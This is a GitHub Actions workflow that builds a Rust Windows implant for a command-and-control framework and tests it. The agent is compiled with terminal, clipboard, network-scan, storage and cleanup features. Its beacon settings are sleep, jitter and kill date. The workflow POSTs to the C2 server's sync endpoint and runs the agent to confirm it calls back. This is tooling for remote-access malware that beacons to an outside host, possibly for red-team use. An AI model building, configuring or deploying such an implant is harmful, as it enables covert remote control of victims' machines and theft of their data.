name: Test Agent Connection

on:
  workflow_dispatch:
    inputs:
      server_url:
        description: 'C2 server URL'
        required: true
        type: string
      aes_key:
        description: 'AES-256 key (hex)'
        required: true
        type: string

jobs:
  test:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup Rust
        uses: dtolnay/rust-toolchain@stable
        with:
          targets: x86_64-pc-windows-msvc

      - name: Build agent (no evasion)
        working-directory: agent
        shell: bash
        env:
          SG_SERVER_URL: ${{ inputs.server_url }}
          SG_AES_KEY: ${{ inputs.aes_key }}
          SG_SLEEP: "3"
          SG_JITTER: "10"
          SG_KILLDATE: "0"
          SG_WORK_HOURS: ""
        run: |
          cargo build --release --target x86_64-pc-windows-msvc --no-default-features --features "terminal,storage,task_viewer,cleanup,network_scan,clipboard"

      - name: Test connectivity first
        shell: bash
        run: |
          echo "Testing server reachability..."
          curl -sv -X POST "${{ inputs.server_url }}/api/v1/sync" \
            -H "Content-Type: application/json" \
            -d '{"session":"dGVzdA==","ts":1234}' 2>&1 || true
          echo ""
          echo "=== DNS resolve ==="
          nslookup $(echo "${{ inputs.server_url }}" | sed 's|https://||' | sed 's|/.*||') 2>&1 || true

      - name: Run agent for 15 seconds
        shell: bash
        run: |
          echo "Starting agent..."
          agent/target/x86_64-pc-windows-msvc/release/agent.exe > agent_stdout.txt 2> agent_stderr.txt &
          AGENT_PID=$!
          echo "Agent PID: $AGENT_PID"
          echo "Waiting 15 seconds..."
          sleep 15
          echo "Killing agent..."
          kill $AGENT_PID 2>/dev/null || taskkill //F //PID $AGENT_PID 2>/dev/null || true
          sleep 2
          echo "=== STDOUT ==="
          cat agent_stdout.txt 2>/dev/null || echo "(empty)"
          echo "=== STDERR ==="
          cat agent_stderr.txt 2>/dev/null || echo "(empty)"
          echo "=== Done ==="
